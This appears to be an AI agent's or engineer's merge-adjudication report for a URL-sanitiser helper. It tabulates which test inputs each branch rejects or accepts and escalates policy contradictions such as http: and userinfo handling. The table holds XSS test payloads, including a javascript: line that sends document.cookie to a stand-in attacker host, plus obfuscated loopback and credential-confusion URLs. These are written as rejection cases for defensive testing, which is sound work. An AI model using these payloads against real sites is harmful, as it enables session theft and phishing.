# safe-url ADD/ADD adjudication — PHASE 1 UNION TABLE

**Status: STOPPED AT THE PHASE 1 STOP CONDITION. Phase 2 not started.**

## Provenance

Adjudicated from a leg tree cloned from the LOCAL path
(`file:///workspace/farmtable` → `/tmp/leg-safeurl`), never from the network
remote. All content below is read via `git show <blob-sha>` against named SHAs,
never from a working tree.

| Side | Commit | impl blob | test blob |
|---|---|---|---|
| MAIN | 439b309 | 659ef58 (`web/src/util/safe-url.ts`) | c3e1b5c (`web/src/util/safe-url.test.ts`) |
| BRANCH | 633f8f2 | d85bb5b (`web/src/util/safe-url.ts`) | a9e49ff (`web/src/util/safe-url.test.ts`) |

All four blob SHAs were re-resolved in the leg clone and match the assignment
exactly.

### Ordering compliance

**I enumerated both test tables BEFORE opening either implementation, and I have
still not opened either implementation.** Blobs 659ef58 and d85bb5b have not been
read at the time of writing. The union table below is derived exclusively from
the two test blobs plus the fixture one of them drives.

### A third artefact, MAIN-only

MAIN's test blob c3e1b5c does not hold all its rows inline. Its
`testSharedFixturesMatchClientColumn` asserts `safeHref` against the `"client"`
column of `testdata/url-scheme-cases.json` — **blob 4a54328** at 439b309. Each
entry there is an asserted (input, expected verdict) pair and therefore a ROW
under the strict definition.

That file **does not exist at 633f8f2**:

```
arg2=[633f8f2:testdata/url-scheme-cases.json]
fatal: path 'testdata/url-scheme-cases.json' does not exist in '633f8f2'
```

This matters beyond counting: blob 4a54328 is the client half of a
server/client differential pin whose other half is
`TestValidateURLFieldMatchesSharedFixtures` in
`internal/server/urlvalidate_differential_test.go`. Discarding MAIN's test blob
would leave the Go half asserting against a fixture that nothing on the client
side checks any more, and it would go green while doing so.

---

## THE THREE INTEGERS

> **LABEL REPAIR, 2026-07-29T15:27Z — struck in place, not deleted.** The table
> immediately below labelled its figures **ROWS**. That noun was wrong: 49 and 45
> are **DISTINCT-INPUT** counts. Every figure was numerically correct and the
> arithmetic downstream is untouched — this was a verified quantity joined to the
> wrong unit, which is the failure mode that cannot go red. Correction carried in
> the commit bearing this note, on top of **c623332** (which carries the struck
> IPv6 presentation row) and **1713ce8**.
>
> **Provenance correction, same timestamp.** The coordinator's acknowledgement
> credited the earlier IPv6 double-count repair to commit **9f81b8f**. That object
> does not exist — `git cat-file -t 9f81b8f` returns `fatal: Not a valid object
> name 9f81b8f`, exit 128. It was a forward-reference I drafted before the commit
> existed and then withdrew; it must not enter the record. The real SHAs are
> **c623332** and **1713ce8**.

| ~~Count~~ | ~~Value~~ |
|---|---|
| ~~**Rows on MAIN side**~~ | ~~**49**~~ |
| ~~**Rows on BRANCH side**~~ | ~~**45**~~ |
| ~~**Rows in UNION**~~ | ~~**82**~~ |

**Restated with the unit named in every line:**

| Side | Distinct inputs | Rows (assertion occurrences) |
|---|---|---|
| **MAIN** | **49 distinct inputs** | **78 rows** |
| **BRANCH** | **45 distinct inputs** | **45 rows** (no input asserted twice — machine-verified, zero duplicates) |
| **UNION** | **81 distinct inputs** | **82 rows** |

MAIN's **78 rows** decompose across its two harnesses:
- Tier A, inline in test blob c3e1b5c: **36 rows over 35 distinct inputs** (the
  extra row is `javascript://evil.com/%0aalert(1)`, asserted once in the rejection
  array and again in `testHostGuardIsAFailClosedBackstop`).
- Tier B, fixture blob 4a54328: **42 rows over 42 distinct inputs**.
- 36 + 42 = **78 rows**; the two tiers overlap on 28 inputs, so 35 ∪ 42 = **49
  distinct inputs**.

MAIN's **49 distinct inputs** = **35 distinct inputs** asserted inline in blob
c3e1b5c + **14 distinct inputs** contributed only by fixture blob 4a54328.

### The three units in play, stated so they cannot be conflated

The repair above introduces a second sense of "row", so all three units are
defined here explicitly. **78 and 82 are NOT on the same basis and must not be
compared.**

1. **Distinct inputs** — unique input strings. MAIN **49**, BRANCH **45**, union
   **81**.
2. **Rows as assertion occurrences** — every assertion site, counting an input
   asserted in two harnesses twice. MAIN **78**, BRANCH **45**. There is no
   meaningful union figure on this basis and none is quoted.
3. **Rows as distinct (input, expected verdict) pairs** — the original strict
   definition. MAIN **49 pairs**, BRANCH **45 pairs**, union **82 pairs**. MAIN's
   pair count equals its distinct-input count because MAIN never asserts one
   input with two different verdicts; the same holds for BRANCH.

**The union figure of 82 is unit 3, not unit 2.** A reader who sets MAIN's 78
against the union's 82 would conclude BRANCH added four rows. It added
**32 distinct inputs** MAIN never asserts, and **33 rows** on basis 3.

Union arithmetic, all on basis 3: 49 pairs + 45 pairs = 94 gross pairs; **12
(input, verdict) pairs** are asserted **identically** by both sides and dedupe
away; 94 − 12 = **82 pairs**, resolving to **81 distinct inputs**.

`http://[::1]/x` is asserted by both sides but with **opposite** verdicts, so it
is **two pairs over one distinct input**, and is deliberately NOT deduplicated —
deduplicating it would make the table self-consistent and destroy the finding.

**The union (81 distinct inputs) does not equal the MAIN count (49 distinct
inputs).** BRANCH contributes **32 distinct inputs** MAIN never exercises (33
rows on basis 3). The "branch contributed nothing" alarm does not fire.

### Rows excluded, and why

These are asserted but are not (input, expected verdict) pairs against the
validator, so they are not rows:

- c3e1b5c `testHostGuardIsAFailClosedBackstop`: `new URL(...)` special/non-special
  probes and the `SAFE_SCHEMES` non-emptiness check. Properties of the WHATWG
  parser, not verdicts of the validator. Its one genuine verdict assertion,
  `safeHref('javascript://evil.com/%0aalert(1)') === undefined`, duplicates a row
  already in the rejection array and is counted once.
- c3e1b5c `testBaseDependenceMarkersAreAccurate`, `testPayloadNeverReachesHref
  Attribute`, `testGuardHoldsForEveryItemInAList`, `testExternalAnchorsKeepTarget
  Blank`: DOM/render/source-grep assertions, not scheme verdicts.
- a9e49ff line 59–63: `LOCAL_HTTP_LINKS_ENABLED === false`. A configuration
  assertion, not an input verdict — but see Contradiction 2, it is what makes
  that contradiction a deliberate policy rather than an accident.

---

## THE UNION TABLE

Verdict key: `R` = must be rejected, `A` = must be accepted, `A(norm)` = accepted
but returned in a normalised (not identity) form, `—` = side does not assert it.

### Group 1 — javascript:, all forms

| # | Input | MAIN | BRANCH | Attack class |
|---|---|---|---|---|
| 1 | `javascript:alert(1)` | R | R | javascript: |
| 2 | `javascript:fetch('//attacker/'+document.cookie)` | R | — | javascript: (exfiltration payload) |
| 3 | `JaVaScRiPt:alert(1)` | R | — | case variation |
| 4 | `JavaScript:alert(1)` | — | R | case variation |
| 5 | `JAVASCRIPT:alert(1)` | R | R | case variation |
| 6 | `\tjavascript:alert(1)` | R | R | leading control char |
| 7 | `\njavascript:alert(1)` | R | R | leading control char |
| 8 | `' javascript:alert(1)'` (one leading space) | R | — | leading whitespace |
| 9 | `'  javascript:alert(1)  '` (space-padded both ends) | — | R | surrounding whitespace |
| 10 | `java\tscript:alert(1)` | R | R | embedded control char smuggling |
| 11 | `java\nscript:alert(1)` | R | — | embedded newline smuggling |
| 12 | `java\rscript:alert(1)` | R | — | embedded CR smuggling |
| 13 | `java\x7fscript:alert(1)` | R (fixture-only) | — | embedded DEL smuggling |
| 14 | `javascript://evil.com/%0aalert(1)` | R | — | nested scheme w/ authority |

### Group 2 — other dangerous schemes

| # | Input | MAIN | BRANCH | Attack class |
|---|---|---|---|---|
| 15 | `data:text/html,<script>alert(1)</script>` | R | R | data: |
| 16 | `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` | R | — | data: base64 |
| 17 | `data://evil.com/x` | R | — | data: with authority |
| 18 | `vbscript:msgbox(1)` | R | R | vbscript: |
| 19 | `blob:https://example.com/uuid` | R | — | blob: |
| 20 | `blob:https://example.com/abc` | — | R | blob: |
| 21 | `file:///etc/passwd` | R | R | file: |
| 22 | `mailto:a@b.com` | R | — | mailto: (deliberate rejection) |
| 23 | `ftp://evil.com/x` | R | — | non-allowlisted special scheme |
| 24 | `ftp://example.com/x` | — | R | non-allowlisted special scheme |
| 25 | `ws://evil.com/x` | R | — | non-allowlisted special scheme |
| 26 | `wss://evil.com/x` | R | — | non-allowlisted special scheme |
| 27 | `httpx://evil.com/x` | R | — | prefix-vs-membership (guards `startsWith('http')`) |

### Group 3 — missing, empty, malformed, relative

| # | Input | MAIN | BRANCH | Attack class |
|---|---|---|---|---|
| 28 | `''` | R | R | empty input |
| 29 | `'   '` (whitespace only) | — | R | whitespace-only input |
| 30 | `null` | R | R | null input |
| 31 | `undefined` | R | R | undefined input |
| 32 | `not-a-url` | R | — | bare word / relative |
| 33 | `not a url` | — | R | bare word with space |
| 34 | `/relative/path` | R | R | absolute-path relative ref |
| 35 | `//evil.com/x` | R | — | protocol-relative |
| 36 | `//example.com/x` | — | R | protocol-relative |
| 37 | `http://` | R | — | scheme without host |
| 38 | `https://` | — | R | scheme without host |
| 39 | `http://[::1/x` | R (fixture-only) | — | malformed IPv6 host |
| 40 | `http://exa mple.com` | R (fixture-only) | — | bare space in host |
| 41 | `https://example.com:99999/x` | R (fixture-only) | — | out-of-range port |

### Group 4 — http:/https: admitted by MAIN (see Contradictions 2 and 3)

| # | Input | MAIN | BRANCH | Attack class |
|---|---|---|---|---|
| 42 | `https://github.com/o/r/pull/1` | A (identity) | — | allowed https |
| 43 | `http://example.com/x` | A (identity) | — | **allowed http — contested** |
| 44 | `HtTpS://example.com` | A (identity, unchanged) | — | case variation on allowed scheme |
| 45 | `https://example.com:8443/x` | A (identity) | — | allowed https with port |
| 46 | `https://example.com/x?a=1&b=2#frag` | A (identity) | — | allowed https, query+fragment |
| 47 | `https://user:pass@example.com/x` | A (identity) | — | **userinfo — contested** |
| 48 | `https://EXAMPLE.com/X` | A (fixture-only) | — | case variation in host/path |
| 49 | `http://例え.jp/x` | A (fixture-only) | — | IDN / unicode host |
| 50 | `http://[::1]/x` | **A** (fixture-only) | **R** | **IPv6 loopback — DIRECT CONTRADICTION** |
| 51 | `http:/\/\evil.com` | A (fixture-only) | — | backslash host confusion |
| 52 | `http:/example.com` | A (fixture-only) | — | single-slash host |
| 53 | `http:example.com` | A (fixture-only) | — | opaque, no slash |
| 54 | `http://example.com/a b` | A (fixture-only) | — | bare space in path |
| 55 | `https://example.com/x\n` | A (fixture-only) | — | trailing newline |
| 56 | `http://example.com/%zz` | A (fixture-only) | — | bad percent escape |
| 57 | `https:///x` | A (fixture-only) | — | empty host with path |

### Group 5 — off-loopback http:, rejected by BRANCH (see Contradiction 2)

| # | Input | MAIN | BRANCH | Attack class |
|---|---|---|---|---|
| 58 | `http://example.com/issues/1` | — | R | **plain http: — contested** |
| 59 | `http://localhost.evil.example/x` | — | R | host-prefix confusion |
| 60 | `http://evil.example/?q=localhost` | — | R | allowlist token in query |
| 61 | `http://localhost@evil.example/` | — | R | userinfo host confusion |
| 62 | `http://evil.example\@localhost/` | — | R | backslash userinfo trick |
| 63 | `http://localhost。evil.example/` | — | R | unicode/homoglyph (ideographic dot) |

### Group 6 — obfuscated loopback, BRANCH only

| # | Input | MAIN | BRANCH | Attack class |
|---|---|---|---|---|
| 64 | `http://localhost:8080/tasks/1` | — | R | loopback (prod config) |
| 65 | `http://127.0.0.1:3000/tasks/1` | — | R | loopback (prod config) |
| 66 | `http://0x7f000001/x` | — | R | hex-encoded loopback |
| 67 | `http://2130706433/x` | — | R | decimal-encoded loopback |
| 68 | `http://127.1/x` | — | R | short-form loopback |
| 69 | `http://0177.0.0.1/x` | — | R | octal-encoded loopback |
| 70 | `http://127．0．0．1/x` | — | R | unicode/homoglyph (fullwidth dot) loopback |
| 71 | `http://0x7f000001:9200/api` | — | R | hex loopback with port |

### Group 7 — embedded credentials, BRANCH only (see Contradiction 3)

| # | Input | MAIN | BRANCH | Attack class |
|---|---|---|---|---|
| 72 | `https://user:pass@evil.example/` | — | R | **userinfo — contested** |
| 73 | `https://ok.example@evil.example/` | — | R | userinfo destination confusion |
| 74 | `https://github.com@evil.example/` | — | R | userinfo lookalike |
| 75 | `https://:pass@evil.example/` | — | R | password-only userinfo |
| 76 | `http://user:pass@localhost/` | — | R | loopback with credentials |

### Group 8 — https: accepted by BRANCH, with normalisation (see Divergence 4)

| # | Input | MAIN | BRANCH | Attack class |
|---|---|---|---|---|
| 77 | `https://github.com/acme/repo/issues/12` | — | A (identity) | allowed https |
| 78 | `HTTPS://github.com/acme/repo` | — | A(norm) → `https://github.com/acme/repo` | case variation, normalised |
| 79 | `'  https://github.com/acme/repo  '` | — | A(norm) → trimmed | surrounding whitespace, normalised |
| 80 | `https://example.com` | — | A(norm) → `https://example.com/` | path normalisation |
| 81 | `https://localhost:8443/x` | — | A | https on loopback allowed |
| ~~82~~ | ~~`http://[::1]/x` (BRANCH's opposing row for #50)~~ | ~~—~~ | ~~R~~ | ~~counted here as the second of the two conflicting rows~~ |

> **WITHDRAWN — line 82, struck above, not deleted.** Concerns test blob
> **a9e49ff** and fixture blob **4a54328**; correction carried in commit
> **c623332** (`c62333229dcae42f5d8c4c37e32e756a06e2351b`), which is the commit
> carrying the struck row itself. Line 82 double-counted BRANCH's `http://[::1]/x` rejection, which
> was already recorded in the BRANCH column of line 50. Machine-checking the
> published columns returned MAIN 49 / BRANCH **46** / both-sides 13, against a
> stated BRANCH count of 45 — the extra line was the discrepancy. The three
> integers below are unchanged and were always 49/45/82; it was this presentation
> row that was wrong, not the counts. Corrected structure: the table has **81
> lines over 81 distinct inputs, carrying 82 rows**, because line 50 alone carries
> two contradictory (input, verdict) pairs and is deliberately not deduplicated.

**Total lines: 81. Total distinct inputs: 81. Total rows enumerated: 82.**

---

## DERIVATION OF THE THREE INTEGERS — row lists, not bare counts

Per the CI-track addendum: a count cannot tell a leak from growth, so each
integer below is reconstructible from the line numbers that produced it. These
lists were extracted mechanically from the published table above, not retyped.

**MAIN = 49 DISTINCT INPUTS** (78 rows as assertion occurrences) — every line whose MAIN column is not `—`:

```
1, 2, 3, 5, 6, 7, 8, 10, 11, 12, 13, 14,
15, 16, 17, 18, 19, 21, 22, 23, 25, 26, 27,
28, 30, 31, 32, 34, 35, 37, 39, 40, 41,
42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57
```
Of these, 14 distinct inputs are contributed only by fixture blob 4a54328 and appear nowhere in
test blob c3e1b5c itself: lines 13, 39, 40, 41, 48, 49, 50, 51, 52, 53, 54, 55,
56, 57. The remaining 35 distinct inputs are asserted inline in c3e1b5c, across 36 assertion occurrences.

**BRANCH = 45 DISTINCT INPUTS** (45 rows; no input asserted twice) — every line whose BRANCH column is not `—`:

```
1, 4, 5, 6, 7, 9, 10,
15, 18, 20, 21, 24,
28, 29, 30, 31, 33, 34, 36, 38,
50,
58, 59, 60, 61, 62, 63,
64, 65, 66, 67, 68, 69, 70, 71,
72, 73, 74, 75, 76,
77, 78, 79, 80, 81
```
All 45 distinct inputs are asserted inline in test blob a9e49ff, one assertion each; BRANCH has no external fixture.

**Deduplicated = 12 (input, verdict) PAIRS** — lines asserted by BOTH sides with the SAME verdict:

```
1, 5, 6, 7, 10, 15, 18, 21, 28, 30, 31, 34
```
All twelve are `R`/`R`. Line 50 is the thirteenth both-sides line but is
`A`/`R` — contradictory, so it stays as two rows and is excluded from this list.

**UNION = 49 + 45 − 12 = 82 (input, verdict) PAIRS, over 81 DISTINCT INPUTS.**

Growth attributable to BRANCH is therefore an explicit set of 32 distinct inputs
(33 rows on the (input, verdict)-pair basis), not a subtraction: lines 4, 9, 20, 24, 29, 33, 36, 38, 50(BRANCH half), 58–76, 77–81.
Rows lost if BRANCH's test blob is discarded are exactly that set; rows lost if
MAIN's is discarded are the 49-list above, of which the 14 fixture-only lines
also take the server/client differential pin with them.

---

## STOP CONDITION — THE TABLES CONTRADICT

Three genuine admit/reject contradictions and one return-contract divergence.
Per the ruling I have **not** resolved any of them in either direction and have
**not** proceeded to Phase 2.

### Contradiction 1 — `http://[::1]/x` (IPv6 loopback). Identical input string, opposite verdicts.

This is the unarguable one: byte-identical input, contradictory expectation.

- **MAIN — ACCEPT.** `testdata/url-scheme-cases.json` blob **4a54328**, case
  `"ipv6 host"`:
  ```json
  {
    "name": "ipv6 host",
    "input": "http://[::1]/x",
    "server": "accept",
    "client": "accept"
  }
  ```
  Enforced by blob **c3e1b5c** line 285, `testSharedFixturesMatchClientColumn`:
  `const got = safeHref(c.input) === undefined ? 'reject' : 'accept';` asserted
  equal to `c.client`.

- **BRANCH — REJECT.** blob **a9e49ff** line 76:
  ```
  assertRejected('http://[::1]/x', 'IPv6 loopback is rejected');
  ```

**Both positions, neutrally.** MAIN treats `[::1]` as an ordinary host: the
scheme is allow-listed, the host parses non-empty, so it is admitted, and the
server column agrees, making it a link the backend would also store. BRANCH
treats loopback as an SSRF/destination-confusion class in its own right and
rejects every spelling of 127.0.0.1 and `::1` under production configuration.
Neither is a bug on its face; they are different threat models.

### Contradiction 2 — the `http:` scheme itself.

- **MAIN — ACCEPT.** blob **c3e1b5c** line 126, inside the `accepted` array of
  `testAcceptsHTTPAndHTTPS`, asserted to be returned **unchanged**:
  ```
  'http://example.com/x',
  ```
  Corroborated by fixture blob 4a54328 case `"http ok"`, `server: accept`,
  `client: accept`.

- **BRANCH — REJECT.** blob **a9e49ff** line 39:
  ```
  assertRejected('http://example.com/issues/1', 'non-localhost http: is rejected');
  ```
  and line 65, rejecting even loopback http under production config:
  ```
  assertRejected('http://localhost:8080/tasks/1', 'http://localhost is rejected in production');
  ```
  BRANCH pins this as deliberate, not incidental, at lines 59–63: it asserts
  `LOCAL_HTTP_LINKS_ENABLED === false` with the comment "Node test runner must
  exercise the production (https-only) configuration".

The input strings differ, so this is not a byte-level collision, but the policy
is flatly opposed: MAIN's allow-list admits `http:`, BRANCH's admits only
`https:` with a dev-only loopback carve-out that is off in production. Every
`http://` row in Group 4 is admitted by MAIN and would be rejected by BRANCH.

### Contradiction 3 — embedded credentials (userinfo) in an https URL.

- **MAIN — ACCEPT.** blob **c3e1b5c** line 130, in the `accepted` array, asserted
  returned unchanged:
  ```
  'https://user:pass@example.com/x',
  ```
  Corroborated by fixture blob 4a54328 case `"userinfo"`, `server: accept`,
  `client: accept`.

- **BRANCH — REJECT.** blob **a9e49ff** lines 49–52:
  ```
  assertRejected('https://user:pass@evil.example/', 'https: with user:pass is rejected');
  assertRejected('https://ok.example@evil.example/', 'https: with userinfo is rejected');
  assertRejected('https://github.com@evil.example/', 'github.com-lookalike userinfo is rejected');
  assertRejected('https://:pass@evil.example/', 'https: with password only is rejected');
  ```
  With a stated rationale at lines 47–48: "Both call sites render *static* link
  text, so the status bar is the user's only cue: `https://github.com@evil.example/`
  reads as github.com."

**Both positions, neutrally.** MAIN scopes the helper to scheme validation and
treats userinfo as out of scope, consistent with its server counterpart also
accepting it. BRANCH scopes the helper to destination trustworthiness and treats
userinfo as a phishing vector given the specific call sites. MAIN's row asserts
identity return; BRANCH's asserts `null`.

### Divergence 4 — return contract: identity vs normalisation. (Not admit/reject; flagged separately so it is not overclaimed.)

- **MAIN** requires the input be returned **byte-identical**. Blob c3e1b5c
  lines 132–137: `safeHref(input) === input`, applied to `'HtTpS://example.com'`
  (line 127) among others.
- **BRANCH** requires **normalisation**. Blob a9e49ff lines 84–98:
  `'HTTPS://github.com/acme/repo'` → `'https://github.com/acme/repo'`;
  `'  https://github.com/acme/repo  '` → trimmed; `'https://example.com'` →
  `'https://example.com/'`.

These cannot both hold for the same function. Any merged implementation must
pick one return contract, and that choice retires rows on whichever side loses.

### Also worth the coordinator's attention (gaps, not contradictions)

- `mailto:` is rejected by MAIN (row 22) and untested by BRANCH. MAIN's comment
  calls it "a deliberate rejection, not an oversight". Not a contradiction, but
  it is knowledge that vanishes if MAIN's test blob is dropped.
- BRANCH's Groups 6 and 7 (obfuscated loopback, credential confusion, homoglyph
  hosts) are 16 distinct inputs with no MAIN counterpart at all. That knowledge vanishes if
  BRANCH's test blob is dropped.
- Fixture blob 4a54328 records 9 deliberate server/client divergences; MAIN's
  test asserts `divergent > 0` as an anti-vacuity control. That apparatus has no
  BRANCH equivalent.

---

## PHASE 2(b) — ONE SURFACE OR TWO? Answer: **ONE SURFACE, RENAMED.**

Read prohibition lifted 2026-07-29T15:29Z for this question only. Both
implementations opened (659ef58, d85bb5b). **No implementation has been
selected.** C2 untouched.

### The answer

`safeHref` and `safeExternalUrl` are **one surface under two names**, not two
distinct surfaces. **"Land both" is NOT on the table**, and this is **not** a
filename collision — it is a genuine policy collision on a single function.

### The measurement that settles it

Docblocks could be argued either way, so this was decided on consumers, not
prose. `git grep` for each name at each commit, excluding the module and its
test:

| Consumer | at 439b309 (MAIN) | at 633f8f2 (BRANCH) |
|---|---|---|
| `web/src/components/inspector/ft-inspector-code.ts` | `safeHref(url)` — PR url | `safeExternalUrl(pr.url)` — PR url |
| `web/src/components/inspector/ft-inspector-meta.ts` | `safeHref(remoteUrl)` — task remote_url | `safeExternalUrl(t.remoteUrl)` — task remoteUrl |
| `safeExternalUrl` anywhere | **(none)** | 2 call sites |
| `safeHref` anywhere | 2 call sites + `url-binding-scan.test.ts` | **(none)** |

The two names are **mutually exclusive across the two commits** — neither
appears at the other's commit. They are consumed by the **same two components**,
at the **same two data fields** (`PullRequest.url`, `Task.remote_url`), feeding
the **same sink** (an `<a href>`), against the **same threat** (stored
`javascript:` reaching an href). Same path, same signature shape
(`string | null | undefined` in).

Two genuinely distinct surfaces would coexist at some commit with different
consumers. These never coexist and never diverge in consumer. That is a rename,
not a second function.

### What a merge must therefore reconcile (recorded, not decided)

Because it is one surface, exactly one of each of these can survive:

| Axis | MAIN 659ef58 | BRANCH d85bb5b |
|---|---|---|
| Sentinel | returns `undefined` | returns `null` |
| Return value | the **original** `raw` (identity, deliberate — "we only want to make a keep/reject decision here, not to rewrite what the user stored") | `url.href` (**normalised**) |
| Scheme policy | `SAFE_SCHEMES = {http:, https:}` | `https:` only, + dev-gated loopback `http:` |
| Userinfo | not checked (accepted) | `if (url.username \|\| url.password) return null` |
| Extra export | `SAFE_SCHEMES` | `LOCAL_HTTP_LINKS_ENABLED` |
| Reject UX | inert span **carrying the raw URL in a `title`** — "degrade, do not drop" | unlinked span showing the id; raw value not surfaced |

The sentinel and return-value axes are mechanical and cheap. The reject-UX axis
is not purely cosmetic: MAIN's call sites keep the rejected value visible to the
user, and MAIN's tests pin that (`.pr-link-unsafe` with a `title`). Dropping it
is a deliberate product change, not a merge artefact.

### Ruling 2 (C3, userinfo → reject) applied to the artefacts

Consistent with what is on disk. BRANCH d85bb5b:63 implements it in one line;
MAIN 659ef58 has no userinfo check at any line — confirming the coordinator's
reading that MAIN accepting it was a fixture, not a considered position. MAIN's
docblock enumerates its known client/server divergences at length and **does not
mention userinfo among them**, which is consistent with it never having been
weighed.

### Ruling 3 (C1, IPv6 loopback) — confirmed subsumed

Verified against d85bb5b: there is no host-axis loopback check in the production
path at all. `LOCAL_HOSTNAMES` is consulted **only** inside the
`LOCAL_HTTP_LINKS_ENABLED && url.protocol === 'http:'` branch (d85bb5b:66). With
`LOCAL_HTTP_LINKS_ENABLED === false`, `http://[::1]/x` is rejected by the scheme
test at d85bb5b:65 before any host reasoning occurs. C1 does indeed fall out of
C2 and must not be decided separately.

### Preliminary flag for Arm B — NOT yet measured, do not treat as a result

The coordinator asked for union rows of the "routing test" shape — rows that pass
against any implementation including none. A first, **unverified** observation:
against a passthrough disarm (`return raw`), every **accept** row is satisfied
trivially, because a passthrough accepts everything. That is 21 of the 82 rows
(MAIN lines 42–57, BRANCH lines 77–81). Of those, BRANCH's three
**normalising** accepts (lines 78, 79, 80) would still fail a raw passthrough,
since they demand a rewritten return value — so the vacuous set is plausibly 18,
not 21. **This is arithmetic on the table, not a measurement, and the diff-line
count and kill set must come from an actual run.** Recorded so it is not
rediscovered as if new.

## Landing context — recorded now, applies at land time, not to this phase

Per the CI-track addendum: the merged web test population is 30 files, up from
26 — four genuinely new test files. **Two of those four are the safe-url pair.**
Enumerated individually so no reader counts the pair twice or not at all:

1. `web/src/util/safe-url.ts` — the implementation half of the pair. MAIN blob
   659ef58 / BRANCH blob d85bb5b, unresolved.
2. `web/src/util/safe-url.test.ts` — the test half. MAIN blob c3e1b5c / BRANCH
   blob a9e49ff, unresolved.

The other two of the four are not mine to name and are not enumerated here.

A caution for whoever does that count: `testdata/url-scheme-cases.json` (blob
4a54328) arrives with the MAIN side and is **not** a web test file, so it must
not be counted toward the 30. It is, however, load-bearing for one of them — if
it lands without MAIN's `safe-url.test.ts`, the file population is correct while
the fixture goes unasserted on the client side.

## What Phase 2 needs before it can start

The union table cannot pick an implementation while rows 43, 47, 50 and the
Group 4/5/7/8 blocks assert mutually exclusive verdicts — running both
implementations against the union would simply report each one failing the other
side's policy rows, which measures the disagreement rather than resolving it.

Contradictions 1, 2 and 3 and Divergence 4 escalate to the coordinator as a
standalone security-policy question: **is this helper a scheme allow-list (MAIN)
or a destination-trust gate (BRANCH), and is `http:` admissible at all?** Once
that is ruled on, the losing side's contested rows are retired *explicitly*, the
remaining ~66 uncontested (input, verdict) pairs stand as the merged table, and Phase 2 can run
both implementations against it.

### Phase 2 protocol as amended 2026-07-29T15:24Z — recorded, not executed

The original Phase 2 instruction was corrected by the CI track before I reached
it. Recording it here so it survives the escalation, since Phase 1 may sit
blocked for some time. **Neither arm has been run. Neither implementation blob
has been opened.**

- **Arm A — conformance.** Run both implementations against the full union table;
  report which rows each fails. If each fails rows the other passes, the answer
  may be a merge, not a winner.
- **Arm B — kill power (mandatory).** For each candidate implementation, apply a
  disarming mutation and confirm the union table goes **red**. The stated defect
  in the original instruction: conformance alone is a pass oracle, and a pass
  oracle cannot show the table guards anything — union two tables, get a bigger
  green, land the weaker code.
  - Source the disarm from `/scion-volumes/scratchpad/projects/farmtable/reports/safehref-disarm.md`
    (dev-xss-r9). It was authored against a different implementation than at
    least one of these two, so its stated limits must be read and the mutation
    adapted honestly rather than assumed to transfer. **Note for whoever runs
    this: BRANCH's entry point is `safeExternalUrl` with a `LOCAL_HTTP_LINKS_ENABLED`
    export, not `safeHref`/`SAFE_SCHEMES`, so a disarm written against `safeHref`
    cannot transfer to blob d85bb5b unmodified.**
  - Report the **diff line count** of the mutation as applied to each
    implementation. A mutant with 0 diff lines is not a surviving mutant, it is
    no mutant.
  - Canary the property, then ask which guard went red. If none did, the property
    is unguarded and **that is the finding**. Name the test files that go red
    individually; "the suite failed" is not a result.
- **The outcome to watch for**, because it looks like success: both
  implementations pass every union row **and** both die to the disarm. That means
  the union table has not discriminated between them. The honest report is then
  "the tests do not choose; here is what does" — not a quiet pick on style,
  structure, or which one reads tidier. **Do not manufacture a winner.**
